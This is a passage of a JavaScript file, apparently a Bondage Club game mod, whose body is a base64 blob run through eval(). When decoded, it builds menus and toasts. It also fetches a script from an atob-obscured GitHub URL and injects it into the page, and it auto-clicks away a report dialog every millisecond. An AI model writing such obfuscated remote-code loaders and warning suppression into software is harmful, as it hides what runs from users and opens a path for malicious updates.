CJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25DaXJjbGUuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b25DaXJjbGUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CgpidXR0b25Db250YWluZXIuYXBwZW5kQ2hpbGQoYnV0dG9uQ2lyY2xlKTsKY29uc3QgbG9nbyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwpsb2dvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwpsb2dvLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKbG9nby5zdHlsZS53aWR0aCA9ICI4MHB4IjsKbG9nby5zdHlsZS5oZWlnaHQgPSAiODBweCI7CmxvZ28uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7CmxvZ28uc3R5bGUubGVmdCA9ICI1MCUiOwpsb2dvLnN0eWxlLnRvcCA9ICI1MCUiOwpsb2dvLnN0eWxlLnRyYW5zZm9ybSA9ICJ0cmFuc2xhdGUoLTUwJSwgLTUwJSkiOwpidXR0b25DaXJjbGUuYXBwZW5kQ2hpbGQobG9nbyk7CmNvbnN0IGJ1dHRvbnMgPSBbXTsKZm9yIChsZXQgaSA9IDA7IGkgPCBidXR0b25EYXRhLmxlbmd0aDsgaSsrKSB7CiAgY29uc3QgYnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgYnV0dG9uLmlubmVyVGV4dCA9IGJ1dHRvbkRhdGFbaV0ubmFtZTsKICBidXR0b24uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogIGJ1dHRvbi5zdHlsZS53aWR0aCA9ICI4MHB4IjsKICBidXR0b24uc3R5bGUuaGVpZ2h0ID0gIjgwcHgiOwogIGJ1dHRvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICBidXR0b24uc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICBidXR0b24uc3R5bGUuY29sb3IgPSAid2hpdGUiOwogIGJ1dHRvbi5zdHlsZS5ib3hTaGFkb3cgPSAiMCAycHggNXB4IHJnYmEoMCwgMCwgMCwgMC4zKSI7CiAgYnV0dG9uLnN0eWxlLmxlZnQgPSAiNTAlIjsKICBidXR0b24uc3R5bGUudG9wID0gIjUwJSI7CiAgYnV0dG9uLnN0eWxlLnRyYW5zZm9ybSA9IGB0cmFuc2xhdGUoLTUwJSwgLTUwJSkgcm90YXRlKCR7aSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKSB0cmFuc2xhdGUoMCwgLTEwMHB4KSByb3RhdGUoJHstaSAqICgzNjAgLyBidXR0b25EYXRhLmxlbmd0aCl9ZGVnKWA7CiAgYnV0dG9uLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjJzIGVhc2UtaW4tb3V0LCB0cmFuc2Zvcm0gMC4ycyBlYXNlLWluLW91dCI7CiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgYnV0dG9uRGF0YVtpXS5hY3Rpb24pOwogIGJ1dHRvbkNvbnRhaW5lci5hcHBlbmRDaGlsZChidXR0b24pOwogIGJ1dHRvbnMucHVzaChidXR0b24pOwoKICAvLyBBZGQgaG92ZXIgYW5pbWF0aW9uCiAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZW50ZXIiLCAoKSA9PiB7CiAgICBidXR0b24uc3R5bGUudHJhbnNmb3JtID0gYHRyYW5zbGF0ZSgtNTAlLCAtNTAlKSByb3RhdGUoJHtpICogKDM2MCAvIGJ1dHRvbkRhdGEubGVuZ3RoKX1kZWcpIHRyYW5zbGF0ZSgwLCAtOTlweCkgcm90YXRlKCR7LWkgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgc2NhbGUoMS4wNSlgOwogIH0pOwoKICBidXR0b24uYWRkRXZlbnRMaXN0ZW5lcigibW91c2VsZWF2ZSIsICgpID0+IHsKICAgIGJ1dHRvbi5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlKC01MCUsIC01MCUpIHJvdGF0ZSgke2kgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgdHJhbnNsYXRlKDAsIC0xMDBweCkgcm90YXRlKCR7LWkgKiAoMzYwIC8gYnV0dG9uRGF0YS5sZW5ndGgpfWRlZykgc2NhbGUoMSlgOwogIH0pOwp9CgoKCi8vIFNob3cvaGlkZSBidXR0b24gY29udGFpbmVyIHdoZW4gYCBhbmQgZSBrZXlzIGFyZSBwcmVzc2VkCmxldCBpc0dyYXZlS2V5RG93biA9IGZhbHNlOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgKGV2ZW50KSA9PiB7CmlmIChldmVudC5rZXkgPT09ICJgIikgewogIGlzR3JhdmVLZXlEb3duID0gdHJ1ZTsKfSBlbHNlIGlmIChpc0dyYXZlS2V5RG93biAmJiBldmVudC5rZXkgPT09ICJlIikgewogIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYnV0dG9uQ29udGFpbmVyKTsKICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKfQp9KTsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5dXAiLCAoZXZlbnQpID0+IHsKaWYgKGV2ZW50LmtleSA9PT0gImAiKSB7CiAgaXNHcmF2ZUtleURvd24gPSBmYWxzZTsKfQp9KTsKCi8vIEhpZGUgYnV0dG9uIGNvbnRhaW5lciB3aGVuIGNsaWNrZWQgb3V0c2lkZSBvZiBpdApkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIChldmVudCkgPT4gewogIGlmICghYnV0dG9uQ29udGFpbmVyLmNvbnRhaW5zKGV2ZW50LnRhcmdldCkpIHsKICAgIGlmIChidXR0b25Db250YWluZXIucGFyZW50Tm9kZSA9PT0gZG9jdW1lbnQuYm9keSkgewogICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGJ1dHRvbkNvbnRhaW5lcik7CiAgICB9CiAgICBidXR0b25Db250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9Cn0pOwoKLy9FbmQgT2YgRW1vdGUgTWVudSBfX19fX19fX19fX19fX19fX18KCi8vRU5EIE9GIENPTlRFWFQgTUVOVSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKLy9CQ01FIExPR08gT24gQ2hhcmFjdGVyCmZldGNoKGF0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDBKRFRWTTNMMEpEVFM5dFlXbHVMMEpEVEM1cWN3PT0nKSkKLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQoudGhlbih0ZXh0ID0+IHsKY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5pbm5lckhUTUwgPSB0ZXh0Owpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7Cn0pCgoKZnVuY3Rpb24gc2hvd1RvYXN0c2NwZygpIHsKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjMiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gzLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwogICAgfQogIH0KICAgIC8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCiAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CgoKLy8gVXBkYXRlIHRoZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhciBhcyBpdCBjb3VudHMgZG93bgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKfSwgMCk7CiAgICAKLy8gQWRkIHRoZSBjdXN0b20gQkNNIGljb24KdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7Cmljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7Cmljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwppY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CgovLyBBZGQgdGhlIHRleHQgbWVzc2FnZQp2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwp0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CnRleHQuaW5uZXJIVE1MID0gIkFjdGlvbiBTdWNjZXNzZnVsbHkgRXhlY3V0ZWQiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCiAgICAKICAKICAgIC8vIEFwcGVuZCB0aGUgdG9hc3QgY29udGFpbmVyIHRvIHRoZSBib2R5CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAKICAgIC8vIFNob3cgdGhlIHRvYXN0IHdpdGggYSBmYWRlIGluIGFuaW1hdGlvbgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICB9LCAwKTsKICAKICAgIC8vIEhpZGUgdGhlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB9LCA1MDAwKTsKICAKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9LCA1NTAwKTsKICAgIHNlbmRGZGVidWcoKTsKCiAgfQogIAoKLy9UaGUgVXBkYXRlIHRvYXN0CmZ1bmN0aW9uIHNob3dUb2FzdFVwZGF0ZSgpIHsKLy8gQ3JlYXRlIHRoZSB0b2FzdCBjb250YWluZXIKdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgI2YyMmMyYyI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CgovLyBVcGRhdGUgdGhlIHdpZHRoIG9mIHRoZSBzdGF0dXMgYmFyIHdoaWxlIGNvdW50aW5nIGRvd24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwoKLy8gQ3JlYXRlIHRoZSBjbG9zZSBidXR0b24KdmFyIGNsb3NlQnV0dG9uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CmNsb3NlQnV0dG9uLnN0eWxlLmJvcmRlciA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUuYmFja2dyb3VuZCA9ICJub25lIjsKY2xvc2VCdXR0b24uc3R5bGUudG9wID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLnJpZ2h0ID0gIjVweCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CmNsb3NlQnV0dG9uLnN0eWxlLmZvbnRTaXplID0gIjE2cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5MZWZ0ID0gIi0ycHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICIwcHgiOwpjbG9zZUJ1dHRvbi5pbm5lckhUTUwgPSAiWCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGNsb3NlQnV0dG9uKTsKCi8vIENsb3NlIHRoZSB0b2FzdCB3aGVuIHRoZSBjbG9zZSBidXR0b24gaXMgY2xpY2tlZApjbG9zZUJ1dHRvbi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgfSwgNTAwKTsKfSk7CgovLyBCQ01FIGxvZ28gdGhlIGxlZnQKdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7Cmljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7Cmljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwppY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CgovLyBVcGRhdGUgY2xpZW50IG1lc3NhZ2UKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJOZXcgdXBkYXRlIGRldGVjdGVkLCByZWZyZXNoIEJDIHRvIHVwZGF0ZSB0byBWMi4wLjciOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCi8vIEFwcGVuZCB0aGUgdG9hc3QgY29udGFpbmVyIHRvIEJDJ3MgYm9keQpkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKCi8vIFNob3cgdGhlIHRvYXN0IHdpdGggYSBmYWRlIGluIGFuaW1hdGlvbgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7Cn0sIDApOwoKLy8gSGlkZSB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7Cn0sIDUwMDAwMDApOwoKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9LCA1NTAwMDAwKTsKCn0KCiAgLy8gRW5kIG9mIFVwZGF0ZSBNYW5lZ3JlIFRvYXN0X19fX19fX19fX19fX19fXwoKICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CgogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiBidXR0b24uY2xpY2soKSk7CiAgICAgIH0KICAgIH0KICB9LCAxKTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKICAgIGlmIChlbGVtZW50VG9SZW1vdmUpIHsKICAgICAgY29uc3QgYnV0dG9ucyA9IGVsZW1lbnRUb1JlbW92ZS5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b25bc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsiXScpOwogICAgICBpZiAoYnV0dG9ucykgewogICAgICAgIGJ1dHRvbnMuZm9yRWFjaChidXR0b24gPT4gewogICAgICAgICAgaWYgKGJ1dHRvbi50ZXh0Q29udGVudCA9PT0gIkRvIG5vdCBzaG93IHRoaXMgcmVwb3J0IGFnYWluIHVubGVzcyBzb21ldGhpbmcgY2hhbmdlcyIgfHwgYnV0dG9uLnRleHRDb250ZW50ID09PSAiQ2xvc2UiKSB7CiAgICAgICAgICAgIGJ1dHRvbi5jbGljaygpOwogICAgICAgICAgfQogICAgICAgIH0pOwogICAgICB9CiAgICB9CiAgfSwgNTAwKTsKCiAgLy8gRGVmaW5lIHRoZSBVUkwgb2YgdGhlIHJhdyBHaXRIdWIgcGFnZSB0byBjaGVjawpjb25zdCB1cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0JDTVM3L0JDTS9tYWluL3VwZGF0ZW1hbmFnZXIuanMnOwovLyBEZWZpbmUgdGhlIG1heGltdW0gdmVyc2lvbiBudW1iZXIgYWxsb3dlZApjb25zdCBtYXhWZXJzaW9uID0gMTU7Ci8vIERlZmluZSBhIGZsYWcgdG8ga2VlcCB0cmFjayBvZiB3aGV0aGVyIHRoZSBhbGVydCBoYXMgYmVlbiB0cmlnZ2VyZWQKbGV0IGFsZXJ0VHJpZ2dlcmVkID0gZmFsc2U7Ci8vIERlZmluZSBhIGZ1bmN0aW9uIHRvIGNoZWNrIHRoZSB2ZXJzaW9uIGFuZCBzaG93IHRoZSBhbGVydCBpZiBuZWNlc3NhcnkKZnVuY3Rpb24gY2hlY2tWZXJzaW9uKCkgewogIGZldGNoKHVybCkKICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgIC50aGVuKHZlcnNpb24gPT4gewogICAgICBpZiAocGFyc2VJbnQodmVyc2lvbikgPiBtYXhWZXJzaW9uICYmICFhbGVydFRyaWdnZXJlZCkgewogICAgICAgIHNob3dUb2FzdFVwZGF0ZSgpOwogICAgICAgIGFsZXJ0VHJpZ2dlcmVkID0gdHJ1ZTsKICAgICAgfQogICAgfSkKICAgIC5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKGVycm9yKSk7Cn0KLy8gQ2hlY2sgZm9yIHVwZGF0ZXMgZXZlcnkgNSBzZWNvbmRzCnNldEludGVydmFsKGNoZWNrVmVyc2lvbiwgNTAwMCk7Cn0KfSkKCgo=')
if (sprc) {
eval(sprc);
}
/*
28
*/
